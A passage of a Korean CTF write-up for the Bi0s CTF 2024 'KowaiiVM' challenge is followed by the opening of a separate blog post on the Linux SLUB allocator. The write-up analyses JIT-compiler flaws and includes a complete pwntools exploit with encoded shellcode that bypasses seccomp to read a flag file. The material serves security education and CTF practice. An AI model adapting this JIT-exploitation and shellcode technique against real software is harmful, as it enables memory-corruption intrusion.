fe-\u0026gt;size) { if(this-\u0026gt;ctx.jitBase \u0026gt;= this-\u0026gt;ctx.jitEnd) error(\u0026#34;Out of executable memory!\u0026#34;); kfe = NULL; reg1 = code[i+1]; reg2 = code[i+2]; reg3 = code[i+3]; imm = *(u64 *)(code+i+2); hash = *(u16 *)(code+i+1); switch(code[i]) { case ADD: if(reg1 != reg2 \u0026amp;\u0026amp; reg1 != reg3) { this-\u0026gt;jitEmitIns(x64_MOVNN, reg1, reg2, x64_NOREG); this-\u0026gt;jitEmitIns(x64_ADD, reg1, reg3, x64_NOREG); } else { if(reg1 == reg2) this-\u0026gt;jitEmitIns(x64_ADD, reg1, reg3, x64_NOREG); else this-\u0026gt;jitEmitIns(x64_ADD, reg1, reg2, x64_NOREG); } i += 4; break; case SUB: if(reg1 != reg2 \u0026amp;\u0026amp; reg1 != reg3) { this-\u0026gt;jitEmitIns(x64_MOVNN, reg1, reg2, x64_NOREG); this-\u0026gt;jitEmitIns(x64_ADD, reg1, reg3, x64_NOREG); } else { if(reg1 == reg2) this-\u0026gt;jitEmitIns(x64_ADD, reg1, reg3, x64_NOREG); // sub r0, r0, r1 else this-\u0026gt;jitEmitIns(x64_SUB, reg1, reg2, x64_NOREG); } i += 4; break; case MUL: this-\u0026gt;jitEmitIns(x64_MOVAN, x64_RAX, reg2, x64_NOREG); this-\u0026gt;jitEmitIns(x64_MUL, reg3, x64_NOREG, x64_NOREG); this-\u0026gt;jitEmitIns(x64_XCHGAN, reg1, x64_NOREG, x64_NOREG); i += 4; break; case SHR: this-\u0026gt;jitEmitIns(x64_MOVALI, x64_RCX, x64_NOREG, x64_NOREG); *this-\u0026gt;ctx.jitBase++ = (u8)imm; this-\u0026gt;jitEmitIns(x64_SHR, reg1, x64_NOREG, x64_NOREG); i += 3; break; case SHL: this-\u0026gt;jitEmitIns(x64_MOVALI, x64_RCX, x64_NOREG, x64_NOREG); *this-\u0026gt;ctx.jitBase++ = (u8)imm; this-\u0026gt;jitEmitIns(x64_SHL, reg1, x64_NOREG, x64_NOREG); i += 3; break; case PUSH: this-\u0026gt;jitEmitIns(x64_PUSH, reg1, x64_NOREG, x64_NOREG); stackBalance.push_back(\u0026#39;x\u0026#39;); i += 2; break; case POP: this-\u0026gt;jitEmitIns(x64_POP, reg1, x64_NOREG, x64_NOREG); stackBalance.pop_back(); i += 2; break; case GET: this-\u0026gt;jitEmitIns(x64_MOVNP, x64_RDX, reg1, x64_NOREG); *(u32 *)this-\u0026gt;ctx.jitBase = (u32)imm; this-\u0026gt;ctx.jitBase += 4; i += 6; break; case SET: this-\u0026gt;jitEmitIns(x64_MOVPN, x64_RDX, reg1, x64_NOREG); *(u32 *)this-\u0026gt;ctx.jitBase = (u32)imm; this-\u0026gt;ctx.jitBase += 4; i += 6; break; case MOV: this-\u0026gt;jitEmitIns(x64_MOVNI, reg1, x64_NOREG, x64_NOREG); *(u32 *)this-\u0026gt;ctx.jitBase = imm; this-\u0026gt;ctx.jitBase += 4; i += 6; break; case CALL: for(int i = 0; i \u0026lt; this-\u0026gt;ctx.bin-\u0026gt;no_funcs; i++) { if(hash == this-\u0026gt;ctx.bin-\u0026gt;funct[i].hash) { kfe = \u0026amp;this-\u0026gt;ctx.bin-\u0026gt;funct[i]; break; } } if(!kfe) error(\u0026#34;Invalid function call!\u0026#34;); if(kfe-\u0026gt;addr \u0026gt;= (u64)this-\u0026gt;ctx.jitEnd || kfe-\u0026gt;addr \u0026lt; (u64)this-\u0026gt;ctx.jitEnd - JIT_SIZE) error(\u0026#34;This shouldn\u0026#39;t happen O__O\u0026#34;); this-\u0026gt;jitEmitIns(x64_MOVAI, x64_RAX, x64_NOREG, x64_NOREG); *(u64 *)this-\u0026gt;ctx.jitBase = kfe-\u0026gt;addr; this-\u0026gt;ctx.jitBase += 8; this-\u0026gt;jitEmitIns(x64_CALLA, x64_RAX, x64_NOREG, x64_NOREG); i += 3; break; case HLT: // too lazy to implement :) case RET: goto cleanup; case NOP: i++; break; default: error(\u0026#34;NANI?!\u0026#34;); break; } } cleanup: *this-\u0026gt;ctx.jitBase++ = x64_RET; mprotect(this-\u0026gt;ctx.jitEnd-JIT_SIZE, JIT_SIZE, PROT_READ | PROT_EXEC); } 검증없이 set / get oob가 발생할 가능성이 있다. 근데 앞서 최적화되기 전에 검증이 있기 때문에 code가 런타임에 수정되지 않는한 취약하지 않다.\nvoid prepareFuncTable() { for(int i = 0; i \u0026lt; this-\u0026gt;bin-\u0026gt;no_funcs; i++) { u64 addr = (u64)(this-\u0026gt;bin-\u0026gt;funct[i].addr); if(addr \u0026gt; this-\u0026gt;bin-\u0026gt;bss || addr \u0026lt; CODE_START_ADDR) error(\u0026#34;Invalid function table!\u0026#34;); 근데 앞서 검증할때 code address \u0026lt; this-\u0026gt;bin-\u0026gt;bss 여야하고, 이에 부정은 code address \u0026gt;= this-\u0026gt;bin-\u0026gt;bss 이기 때문에 bss 영역에 코드를 작성하고 call hash를 통해 런타임에 수정되는 코드를 만들 수 있다.\n한번 JIT 컴파일이 되면, push / pop 같은 스택 조작 명령을 통해 실제 레지스터 rip에 대한 컨트롤이 가능하다.\n__attribute__((noinline)) __attribute__((naked)) void jitCall(kowaiiFuncEntry *fe) { __asm__( \u0026#34;push rbp;\u0026#34; \u0026#34;push r8;\u0026#34; \u0026#34;push r9;\u0026#34; \u0026#34;push r10;\u0026#34; \u0026#34;push r11;\u0026#34; \u0026#34;push r12;\u0026#34; \u0026#34;push r13;\u0026#34; \u0026#34;push r14;\u0026#34; \u0026#34;push r15;\u0026#34; \u0026#34;push rdi;\u0026#34; \u0026#34;push rdx;\u0026#34; \u0026#34;push rcx;\u0026#34; \u0026#34;xor r8, r8;\u0026#34; \u0026#34;xor r9, r9;\u0026#34; \u0026#34;mov rbp, rsp;\u0026#34; \u0026#34;mov rdx, qword ptr [rdi+0x28];\u0026#34; \u0026#34;mov rdi, qword ptr [rdi+0x10];\u0026#34; \u0026#34;mov r10, qword ptr [rdi];\u0026#34; \u0026#34;mov r11, qword ptr [rdi+0x8];\u0026#34; \u0026#34;mov r12, qword ptr [rdi+0x10];\u0026#34; \u0026#34;mov r13, qword ptr [rdi+0x18];\u0026#34; \u0026#34;mov r14, qword ptr [rdi+0x20];\u0026#34; \u0026#34;mov r15, qword ptr [rdi+0x28];\u0026#34; \u0026#34;mov rsp, qword ptr [rdi+0x38];\u0026#34; \u0026#34;call qword ptr [rsi+0x2];\u0026#34; \u0026#34;mov qword ptr [rdi], r10;\u0026#34; \u0026#34;mov qword ptr [rdi+0x8], r11;\u0026#34; \u0026#34;mov qword ptr [rdi+0x10], r12;\u0026#34; \u0026#34;mov qword ptr [rdi+0x18], r13;\u0026#34; \u0026#34;mov qword ptr [rdi+0x20], r14;\u0026#34; \u0026#34;mov qword ptr [rdi+0x28], r15;\u0026#34; \u0026#34;mov rsp, rbp;\u0026#34; \u0026#34;pop rcx;\u0026#34; \u0026#34;pop rdx;\u0026#34; \u0026#34;pop rdi;\u0026#34; \u0026#34;pop r15;\u0026#34; \u0026#34;pop r14;\u0026#34; \u0026#34;pop r13;\u0026#34; \u0026#34;pop r12;\u0026#34; \u0026#34;pop r11;\u0026#34; \u0026#34;pop r10;\u0026#34; \u0026#34;pop r9;\u0026#34; \u0026#34;pop r8;\u0026#34; \u0026#34;pop rbp;\u0026#34; \u0026#34;ret\u0026#34; ); } 근본적으로 call 함수에서 rsp에 직접 vm 스택의 주소가 담기고, 실제로 push / pop / call 을 수행할 수 있다면 JIT page도 릭할 수 있다. JIT compile된 함수는 이미 JIT compile된 함수만 call이 가능하다. call 이전에 이미 rsp는 vm stack의 주소로 변경되었으니 이를 이용해 JIT page leak이 가능하다. 그리고 pop ret 가젯을 만들고 push ret 가젯을 만들어서 pop으로 binary base를 구하고 push ret으로 context 복구가 가능하다.\n사실 bss에 쓰기 가능한 코드를 이용해 JIT gen 함수의 취약점을 악용할 필요도 없이 설계상의 문제로도 그냥 익스플로잇이 가능했다.\n#ifdef SECCOMP void kowaiiSeccomp() { scmp_filter_ctx sctx; sctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); cout \u0026lt;\u0026lt; \u0026#34;[*] Applying seccomp filetrs, no escape ;)\u0026#34; \u0026lt;\u0026lt; endl; close(STDIN_FILENO); if(seccomp_load(sctx)) error(\u0026#34;Seccomp error :^(\u0026#34;); } #endif seccomp bypass를 위해서 JIT에 mov imm32를 통해서 4바이트씩 쉘코드를 작성하고 \\xeb\\x02로 쉘코드를 이을 수 있다.\nExploit from pwn import * class COMPILER: ADD =0xb0 SUB =0xb1 MUL =0xb2 SHR =0xb3 SHL =0xb4 PUSH =0xb5 POP =0xb6 GET =0xb7 SET =0xb8 MOV =0xb9 CALL =0xba RET =0xbb NOP =0xbc HLT =0xbf @staticmethod def add(dst, src1, src2): payload = b\u0026#39;\u0026#39; payload += p8(compiler.ADD) payload += p8(dst) payload += p8(src1) payload += p8(src2) return payload @staticmethod def sub(dst, src1, src2): payload = b\u0026#39;\u0026#39; payload += p8(compiler.SUB) payload += p8(dst) payload += p8(src1) payload += p8(src2) return payload @staticmethod def mov(dst, imm32): payload = b\u0026#39;\u0026#39; payload += p8(compiler.MOV) payload += p8(dst) payload += p32(imm32) return payload @staticmethod def shl(dst, imm8): payload = b\u0026#39;\u0026#39; payload += p8(compiler.SHL) payload += p8(dst) payload += p8(imm8) return payload @staticmethod def get(dst,imm32): payload = b\u0026#39;\u0026#39; payload += p8(compiler.GET) payload += p8(dst) payload += p32(imm32) return payload @staticmethod def set(src,imm32): payload = b\u0026#39;\u0026#39; payload += p8(compiler.SET) payload += p8(src) payload += p32(imm32) return payload @staticmethod def call(hash): payload = b\u0026#39;\u0026#39; payload += p8(compiler.CALL) payload += p16(hash) return payload @staticmethod def ret(): payload = b\u0026#39;\u0026#39; payload += p8(compiler.RET) return payload @staticmethod def hlt(): payload = b\u0026#39;\u0026#39; payload += p8(compiler.HLT) return payload @staticmethod def push(reg): payload = b\u0026#39;\u0026#39; payload += p8(compiler.PUSH) payload += p8(reg) return payload @staticmethod def pop(reg): payload = b\u0026#39;\u0026#39; payload += p8(compiler.POP) payload += p8(reg) return payload @staticmethod def nop(): payload = b\u0026#39;\u0026#39; payload += p8(compiler.NOP) return payload @staticmethod def shl(dst, imm8): payload = b\u0026#39;\u0026#39; payload += p8(compiler.SHL) payload += p8(dst) payload += p8(imm8) return payload class KOWAII: CODE_START = 0x1000 def __init__(self, bss): self.funcs = [] assert bss \u0026gt;= 0xc000 self.bss = bss self.entry = 0 self.code = b\u0026#39;\u0026#39; self.bss_data = b\u0026#39;\u0026#39; def set_main(self,code): self.entry = len(self.code) + KOWAII.CODE_START self.code += code def add_func(self, code, addr = 0xdeadbeef, sz = 0xdeadbeef): assert len(self.funcs) \u0026lt;= 0x80 if addr == 0xdeadbeef: addr = len(self.code)+KOWAII.CODE_START if sz == 0xdeadbeef: sz = len(code) f = { \u0026#39;hash\u0026#39; : len(self.funcs), \u0026#39;addr\u0026#39; : addr, \u0026#39;size\u0026#39; : sz, \u0026#39;callCount\u0026#39; : 0, } self.code += code self.funcs.append(f) def get_binary(self): binary = b\u0026#39;KOWAII\u0026#39; binary += p16(self.entry) binary += p32(0xdeadc0de) binary += p16(self.bss) binary += p8(len(self.funcs)) for i in self.funcs: binary += p16(i[\u0026#39;hash\u0026#39;]) binary += p64(i[\u0026#39;addr\u0026#39;]) binary += p8(i[\u0026#39;size\u0026#39;]) binary += p8(i[\u0026#39;callCount\u0026#39;]) binary += b\u0026#39;\\x00\u0026#39; * (KOWAII.CODE_START-len(binary)) binary += self.code if len(self.bss_data) \u0026gt; 0: binary += b\u0026#39;\\x00\u0026#39; * (self.bss - len(binary)) binary += self.bss_data return binary def get_func(self, idx): return self.funcs[idx] def set_bss_data(self, data): self.bss_data = data if __name__ == \u0026#39;__main__\u0026#39;: r0,r1,r2,r3,r4,r5 = 0,1,2,3,4,5 kowaii = KOWAII(bss=0xc000) compiler = COMPILER() pop_func = b\u0026#39;\u0026#39; # JIT_MS = 0xa pop_func += compiler.pop(r0) pop_func += compiler.nop() * 0x10 pop_func += compiler.ret() popf = 0 get_pc = b\u0026#39;\u0026#39; # will not be optimized get_pc += compiler.pop(r0) get_pc += compiler.set(r0, 0xf00) get_pc += compiler.push(r0) get_pc += compiler.ret() get_pcf = 1 kowaii.add_func(pop_func) kowaii.add_func(get_pc) def optimize(func, additional_code_perloop = b\u0026#39;\u0026#39;,additional_code_perloop1 = b\u0026#39;\u0026#39; ,JIT_CC = 0xa, JIT_MS = 0xa): assert kowaii.get_func(func)[\u0026#39;size\u0026#39;] \u0026gt;= JIT_MS code = b\u0026#39;\u0026#39; code += compiler.call(get_pcf) code += compiler.get(r5, 0xf00) for it in range(JIT_CC): code += compiler.mov(r1, 6+(13+len(additional_code_perloop+additional_code_perloop1))*(it+1)) code += compiler.add(r1,r5,r1) code += additional_code_perloop code += compiler.call(func) code += additional_code_perloop1 return code \u0026#39;\u0026#39;\u0026#39; - vmpc \u0026amp; r0 ~ r5 can be controlled - rip \u0026amp; rax, cl, rdx, r10 ~ r15 can be controlled - writable bss can be controlled \u0026#39;\u0026#39;\u0026#39; # 1) Leak JIT page jit_leak = b\u0026#39;\u0026#39; jit_leak += compiler.nop() * 0x10 jit_leak += compiler.call(popf) jit_leak += compiler.ret() jit_leakf = 2 kowaii.add_func(jit_leak) main = b\u0026#39;\u0026#39; main += optimize(jit_leakf, additional_code_perloop1= compiler.push(r1) + compiler.ret()) # popf is already optimized # main += optimize(popf, additional_code_perloop = compiler.push(r1)) # already optimized main += compiler.call(jit_leakf) main += compiler.mov(r1, 0xf) main += compiler.sub(r0, r0, r1) main += compiler.set(r0, 0xf08) # bss+0xf08 = JIT page # 2) Leak binary base # call pop ret -\u0026gt; push ret -\u0026gt; flow recover push_ret = compiler.nop() * 0x10 push_ret += compiler.push(r0) push_ret += compiler.ret() kowaii.add_func(push_ret) pushf = 3 main += optimize(pushf, additional_code_perloop = compiler.mov(r2,0) + compiler.add(r0,r1,r2)) main += compiler.mov(r1, 0x10) main += compiler.get(r0, 0xf08) # get JIT main += compiler.add(r0, r1, r0) main += compiler.push(r0) # r0 = (push r10; ret) main += compiler.call(popf) # return to (push r10; ret) which will recover the context main += compiler.mov(r1, 0x4193) main += compiler.sub(r0, r0, r1) # get binbase main += compiler.set(r0, 0xf10) # bss+0xf10 = binbase # 3) write shellcode in JIT # 0x0000000000004b0e : add byte ptr [rax + 0x29], cl ; ret # once call opcode is jit compiled and executed, rax always points to the JIT address. # and cl register can be controlled using shl opcode # 3) vmpc = bss and modifying imm32 of mov # once SET/GET instruction is jit compiled, bounds check is eliminated # if(addr \u0026gt; this-\u0026gt;bin-\u0026gt;bss || addr \u0026lt; CODE_START_ADDR) error(\u0026#34;Invalid function table!\u0026#34;); # function entry can point to the starting point of bss def gen_shellcode(c): code = asm(c) assert len(code) \u0026lt;= 2 payload = compiler.mov(0, u32(code.ljust(2,b\u0026#39;\\x90\u0026#39;) + b\u0026#39;\\xeb\\x02\u0026#39;)) return payload # context.arch = \u0026#39;amd64\u0026#39; # shellcode = b\u0026#39;\u0026#39; # shellcode += gen_shellcode(\u0026#39;xor eax, eax\u0026#39;) # shellcode += gen_shellcode(\u0026#39;inc eax\u0026#39;) # shellcode += gen_shellcode(\u0026#39;inc eax\u0026#39;) # shellcode += gen_shellcode(\u0026#39;push r11\u0026#39;) # path # shellcode += gen_shellcode(\u0026#39;pop rdi\u0026#39;) # shellcode += gen_shellcode(\u0026#39;push 0\u0026#39;) # shellcode += gen_shellcode(\u0026#39;pop rsi\u0026#39;) # shellcode += gen_shellcode(\u0026#39;push 0\u0026#39;) # shellcode += gen_shellcode(\u0026#39;pop rdx\u0026#39;) # shellcode += gen_shellcode(\u0026#39;syscall\u0026#39;) # shellcode += gen_shellcode(\u0026#39;push rax\u0026#39;) # shellcode += gen_shellcode(\u0026#39;pop rdi\u0026#39;) # shellcode += gen_shellcode(\u0026#39;push rsp\u0026#39;) # shellcode += gen_shellcode(\u0026#39;pop rsi\u0026#39;) # shellcode += gen_shellcode(\u0026#39;push 0x7f\u0026#39;) # shellcode += gen_shellcode(\u0026#39;pop rdx\u0026#39;) # shellcode += gen_shellcode(\u0026#39;xor eax, eax\u0026#39;) # shellcode += gen_shellcode(\u0026#39;syscall\u0026#39;) # shellcode += gen_shellcode(\u0026#39;xor eax, eax\u0026#39;) # shellcode += gen_shellcode(\u0026#39;inc eax\u0026#39;) # shellcode += gen_shellcode(\u0026#39;push rsp\u0026#39;) # shellcode += gen_shellcode(\u0026#39;pop rsi\u0026#39;) # shellcode += gen_shellcode(\u0026#39;push 1\u0026#39;) # shellcode += gen_shellcode(\u0026#39;pop rdi\u0026#39;) # shellcode += gen_shellcode(\u0026#39;push 0x7f\u0026#39;) # shellcode += gen_shellcode(\u0026#39;pop rdx\u0026#39;) # shellcode += gen_shellcode(\u0026#39;syscall\u0026#39;) # shellcode += compiler.ret() # print(list(shellcode)) shellcode = bytes([185, 0, 49, 192, 235, 2, 185, 0, 255, 192, 235, 2, 185, 0, 255, 192, 235, 2, 185, 0, 65, 83, 235, 2, 185, 0, 95, 144, 235, 2, 185, 0, 106, 0, 235, 2, 185, 0, 94, 144, 235, 2, 185, 0, 106, 0, 235, 2, 185, 0, 90, 144, 235, 2, 185, 0, 15, 5, 235, 2, 185, 0, 80, 144, 235, 2, 185, 0, 95, 144, 235, 2, 185, 0, 84, 144, 235, 2, 185, 0, 94, 144, 235, 2, 185, 0, 106, 127, 235, 2, 185, 0, 90, 144, 235, 2, 185, 0, 49, 192, 235, 2, 185, 0, 15, 5, 235, 2, 185, 0, 49, 192, 235, 2, 185, 0, 255, 192, 235, 2, 185, 0, 84, 144, 235, 2, 185, 0, 94, 144, 235, 2, 185, 0, 106, 1, 235, 2, 185, 0, 95, 144, 235, 2, 185, 0, 106, 127, 235, 2, 185, 0, 90, 144, 235, 2, 185, 0, 15, 5, 235, 2, 187]) kowaii.add_func(shellcode) shellcodef = 4 kowaii.set_bss_data(b\u0026#39;./flag.txt\u0026#39;) main += optimize(shellcodef) main += compiler.get(r0, 0xf08) # get JIT main += compiler.mov(r1, 0x15) main += compiler.add(r0, r0, r1) main += compiler.push(r0)*0x20 main += compiler.push(r0) main += compiler.get(r0, 0xf00) # get bss main += compiler.mov(r1,0xad45) main += compiler.add(r1,r0,r1) main += compiler.shl(r5,0xf) main += compiler.call(popf) main += compiler.hlt() # shellcode start jit + 0x15 kowaii.set_main(main) binary = kowaii.get_binary() p = process(\u0026#39;./out.bin\u0026#39;,env={\u0026#34;LD_mainLOAD\u0026#34;:\u0026#34;./libm.so.6 ./libseccomp.so.2\u0026#34;}) p.sendafter(b\u0026#39;binary\u0026#39;,binary+b\u0026#39;\\x0a\u0026#39;*2) pause() p.sendlineafter(b\u0026#39;mode?\u0026#39;,b\u0026#39;y\u0026#39;) p.interactive() ","permalink":"https://msh1307.kr/blog/bi0s_ctf_2024_kowaiivm/","summary":"Kowaii VM Analysis 문제에서 소스코드를 제공해준다.\n---- 0x0000 Header data ---- 0x1000 .CODE ---- bss \u0026gt;= 0xc000 .BSS ---- 0xffff 위와 같은 바이너리 구조를 입력으로 받는다.\nclass kowaiiCtx { private: void *genAddr() { u64 r = 0; do r = (u64)rand(); while((int)r \u0026lt; 0); return (void *)(r \u0026lt;\u0026lt; 12); } public: kowaiiBin *bin; kowaiiRegisters *regs; kowaiiFuncEntry **callStack; kowaiiFuncEntry **callStackBase; u8 *bss; u8 *jitBase; u8 *jitEnd; kowaiiCtx() { this-\u0026gt;bin = (kowaiiBin *)mmap(this-\u0026gt;genAddr(), MAX_BIN_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); this-\u0026gt;regs = (kowaiiRegisters *)calloc(1,sizeof(kowaiiRegisters)); if(this-\u0026gt;bin == (void *)-1 || this-\u0026gt;regs == NULL) error(\u0026#34;Memory error!","title":"Bi0s CTF 2024 - KowaiiVM"},{"content":"SLUB Allocator Userland에선 ptmalloc2가 있는 반면, Kernelland에선 SLUB이 있다. 초기엔 SLAB Allocator를 사용했지만, 현재 대부분의 배포판은 SLUB을 이용한다. 기존 SLAB allocator의 단점을 개선한 버전이다. kmem_cache_create로 slab cache를 생성하고 kmem_cache_alloc으로 지정된 slab cache에서 object를 할당한다. kmem_cache_free로 free하고 kmem_cache_destroy로 slab cache를 제거한다. kmalloc, kzalloc 같은 함수는 kmalloc-N 캐시에서 적합한 size인 object를 할당한다.\nTerms slab SLAB allocator랑 다른말이다. slab cache (= kmem_cache)를 확보하고 관리하는 주체다.\nslab cache msh@raspberrypi:~ $ sudo cat /proc/slabinfo slabinfo - version: 2.1 # name \u0026lt;active_objs\u0026gt; \u0026lt;num_objs\u0026gt; \u0026lt;objsize\u0026gt; \u0026lt;objperslab\u0026gt; \u0026lt;pagesperslab\u0026gt; : tunables \u0026lt;limit\u0026gt; \u0026lt;batchcount\u0026gt; \u0026lt;sharedfactor\u0026gt; : slabdata \u0026lt;active_slabs\u0026gt; \u0026lt;num_slabs\u0026gt; \u0026lt;sharedavail\u0026gt; fuse_request 0 0 144 113 1 : tunables 0 0 0 : slabdata 0 0 0 fuse_inode 0 0 832 19 1 : tunables 0 0 0 : slabdata 0 0 0 kcopyd_job 0 0 3240 20 4 : tunables 0 0 0 : slabdata 0 0 0 ip6-frags 0 0 184 89 1 : tunables 0 0 0 : slabdata 0 0 0 PINGv6 0 0 1216 26 2 : tunables 0 0 0 : slabdata 0 0 0 RAWv6 78 78 1216 26 2 : tunables 0 0 0 : slabdata 3 3 0 UDPv6 96 96 1344 24 2 : tunables 0 0 0 : slabdata 4 4 0 tw_sock_TCPv6 0 0 264 62 1 : tunables 0 0 0 : slabdata 0 0 0 request_sock_TCPv6 0 0 312 52 1 : tunables 0 0 0 : slabdata 0 0 0 TCPv6 108 108 2368 27 4 : tunables 0 0 0 : slabdata 4 4 0 ext4_groupinfo_4k 11303 11303 184 89 1 : tunables 0 0 0 : slabdata 127 127 0 scsi_sense_cache 256 256 128 128 1 : tunables 0 0 0 : slabdata 2 2 0 fscrypt_info 0 0 128 128 1 : tunables 0 0 0 : slabdata 0 0 0 bio-120 640 640 128 128 1 : tunables 0 0 0 : slabdata 5 5 0 mqueue_inode_cache 17 17 960 17 1 : tunables 0 0 0 : slabdata 1 1 0 nfs4_xattr_cache_cache 0 0 2128 30 4 : tunables 0 0 0 : slabdata 0 0 0 nfs_direct_cache 0 0 224 73 1 : tunables 0 0 0 : slabdata 0 0 0 nfs_commit_data 23 23 704 23 1 : tunables 0 0 0 : slabdata 1 1 0 nfs_read_data 36 36 896 18 1 : tunables 0 0 0 : slabdata 2 2 0 nfs_inode_cache 0 0 1072 30 2 : tunables 0 0 0 : slabdata 0 0 0 fat_inode_cache 60 60 784 20 1 : tunables 0 0 0 : slabdata 3 3 0 fat_cache 818 818 40 409 1 : tunables 0 0 0 : slabdata 2 2 0 jbd2_journal_head 680 680 120 136 1 : tunables 0 0 0 : slabdata 5 5 0 jbd2_revoke_table_s 2048 2048 16 1024 1 : tunables 0 0 0 : slabdata 2 2 0 ext4_fc_dentry_update 0 0 96 170 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_inode_cache 11274 11286 1184 27 2 : tunables 0 0 0 : slabdata 418 418 0 ext4_allocation_context 480 480 136 120 1 : tunables 0 0 0 : slabdata 4 4 0 ext4_system_zone 1227 1227 40 409 1 : tunables 0 0 0 : slabdata 3 3 0 ext4_io_end 1024 1024 64 256 1 : tunables 0 0 0 : slabdata 4 4 0 ext4_bio_post_read_ctx 341 341 48 341 1 : tunables 0 0 0 : slabdata 1 1 0 ext4_pending_reservation 2048 2048 32 512 1 : tunables 0 0 0 : slabdata 4 4 0 ext4_extent_status 6119 6135 40 409 1 : tunables 0 0 0 : slabdata 15 15 0 mbcache 1168 1168 56 292 1 : tunables 0 0 0 : slabdata 4 4 0 kioctx 0 0 576 28 1 : tunables 0 0 0 : slabdata 0 0 0 fanotify_fid_event 0 0 72 227 1 : tunables 0 0 0 : slabdata 0 0 0 dnotify_struct 0 0 32 512 1 : tunables 0 0 0 : slabdata 0 0 0 audit_tree_mark 0 0 80 204 1 : tunables 0 0 0 : slabdata 0 0 0 kvm_vcpu 0 0 9680 13 8 : tunables 0 0 0 : slabdata 0 0 0 rpc_inode_cache 23 23 704 23 1 : tunables 0 0 0 : slabdata 1 1 0 UNIX 210 210 1088 30 2 : tunables 0 0 0 : slabdata 7 7 0 ip4-frags 0 0 200 81 1 : tunables 0 0 0 : slabdata 0 0 0 MPTCP 0 0 1920 17 2 : tunables 0 0 0 : slabdata 0 0 0 request_sock_subflow_v4 0 0 384 42 1 : tunables 0 0 0 : slabdata 0 0 0 xfrm_dst_cache 0 0 320 51 1 : tunables 0 0 0 : slabdata 0 0 0 xfrm_state 0 0 768 21 1 : tunables 0 0 0 : slabdata 0 0 0 ip_fib_trie 1364 1364 48 341 1 : tunables 0 0 0 : slabdata 4 4 0 ip_fib_alias 1168 1168 56 292 1 : tunables 0 0 0 : slabdata 4 4 0 PING 0 0 1024 16 1 : tunables 0 0 0 : slabdata 0 0 0 RAW 16 16 1024 16 1 : tunables 0 0 0 : slabdata 1 1 0 커널에는 이런식으로 미리 여러 슬랩캐시들이 확보되어있다. 주로 프로세스 생성에 자주 사용되는 task struct, cred 들도 미리 확보되어있다.\nslab page slab object 할당을 위해 Buddy system에서 할당받은 order-n 단위의 page.\nslab object slab cache에서 관리하는 object.\nBuddy system 외부 단편화를 줄이기위해 4k 사이즈의 page 단위로 할당한다. slab allocator는 반대로 buddy system에서 받은 page를 잘 관리해서 내부 단편화를 줄이기 위해 사용된다.\nInternal Structure SLAB vs SLUB SLAB allocator의 구조다. SLUB allocator의 구조다. struct page는 struct slab으로 구조체 이름이 변경되었다. cpu 별 cache를 둠으로써 lock less한 처리가 가능해졌다.\n왜 이런 구조가 되었는지 이해하려면 NUMA 아키텍쳐에 대해서 알아보아야한다.\nNUMA (Non-uniform memory access) 한 개 이상의 CPU가 동일한 시스템 자원을 사용하는 시스템을 SMP (Symmetric Multi-Processors) 환경이라고 부른다. SMP 환경에서는 동일한 자원에 대한 병목이 발생한다. 특정 프로세서가 하나의 주요 자원을 선점하고 lock을 걸어놓으면 당연하게 지연이 발생한다.\n멀티 프로세서 시스템에서의 메모리 설계 아키텍쳐를 NUMA라고 부른다. 위와 같은 구조다. Node를 만들어서 구분해놓은 것을 볼 수 있다. CPU에 메모리 버스를 하나씩 물려놓고 각자 memory를 붙여놨다. local memory에 access 하는건 빠르지만, 상대적으로 다른 node의 메모리 access는 느리다는게 특징이다.\n실제로 물리적인 cpu의 성능도 올라가고 core, thread 수도 올라가고 하이퍼쓰레딩같은 기술도 나오다보니 이러한 아키텍쳐가 많이 활용된다. SLUB allocator도 예외는 아니다.\nkmem_cache struct kmem_cache { struct kmem_cache_cpu __percpu *cpu_slab; /* Used for retriving partial slabs etc */ unsigned long flags; unsigned long min_partial; int size;\t/* The size of an object including meta data */ int object_size;\t/* The size of an object without meta data */ int offset;\t/* Free pointer offset. */ #ifdef CONFIG_SLUB_CPU_PARTIAL int cpu_partial;\t/* Number of per cpu partial objects to keep around */ #endif struct kmem_cache_order_objects oo; /* Allocation and freeing of slabs */ struct kmem_cache_order_objects max; struct kmem_cache_order_objects min; gfp_t allocflags;\t/* gfp flags to use on each alloc */ int refcount;\t/* Refcount for slab cache destroy */ void (*ctor)(void *); int inuse;\t/* Offset to metadata */ int align;\t/* Alignment */ int reserved;\t/* Reserved bytes at the end of slabs */ int red_left_pad;\t/* Left redzone padding size */ const char *name;\t/* Name (only for display!) */ struct list_head list;\t/* List of slab caches */ #ifdef CONFIG_SYSFS struct kobject kobj;\t/* For sysfs */ struct work_struct kobj_remove_work; #endif #ifdef CONFIG_MEMCG struct memcg_cache_params memcg_params; int max_attr_size; /* for propagation, maximum size of a stored attr */ #ifdef CONFIG_SYSFS struct kset *memcg_kset; #endif #endif #ifdef CONFIG_SLAB_FREELIST_HARDENED unsigned long random; #endif #ifdef CONFIG_NUMA /* * Defragmentation by allocating from a remote node. */ int remote_node_defrag_ratio; #endif #ifdef CONFIG_SLAB_FREELIST_RANDOM unsigned int *random_seq; #endif #ifdef CONFIG_KASAN struct kasan_cache kasan_info; #endif struct kmem_cache_node *node[MAX_NUMNODES]; }; struct kmem_cache_cpu __percpu *cpu_slab은 cpu별 슬랩 캐시를 관리하는 구조체다. struct kmem_cache_node *node[MAX_NUMNODES]는 앞서 설명한 NUMA node별로 관리하기 위한 구조체이다. unsigned int *random_seq은 Freelist randomization이 적용되면서 추가되었다.\nFlags 이런식으로 slab cache마다 플래그가 다르다. rcl은 자주 reclaim 하는 inode같은 객체들을 위해 이용된다. cg는 가변 크기 객체에 대해서 사용이 많이된다. dma는 dma 관련 메모리 할당에 이용된다\n그중 SLAB_ACCOUNT는 GFP_KERNEL_ACCOUNT와 독립된 캐시를 이용한다. 중간에 